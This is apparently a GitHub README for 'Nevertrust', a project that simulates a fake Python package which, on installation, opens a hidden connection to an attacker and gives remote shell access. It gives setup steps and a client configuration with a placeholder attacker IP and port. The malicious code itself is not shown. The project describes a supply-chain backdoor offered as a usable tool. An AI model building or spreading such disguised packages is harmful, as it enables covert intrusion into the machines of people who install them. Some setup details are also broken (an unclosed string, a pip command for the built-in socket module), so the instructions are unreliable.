# Nevertrust
This project Simulates a fake library of python that when the target see the installation of the packets, there is a side channel that open a connection to attacker and give him possible Shellcode attack.
## Installation

You need to install socket and tqdm libraries
```bash
pip install socket tqdm 
```

## Preparations

first you make sure that you insert the correct IP of the attacker in the client file.
```python
SERVER_HOST = "IP_of_attacker"
SERVER_PORT = 5004
BUFFER_SIZE = 1440  # max size of messages, setting to 1440 after experimentation, MTU size
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>
```

# Run
```
pip install socket tqdm 
```
![צילום מסך 2024-01-25 065805](https://github.com/ronch11/Nevertrust/assets/71279601/bd3e7152-2010-4b24-b127-b0101115d547)



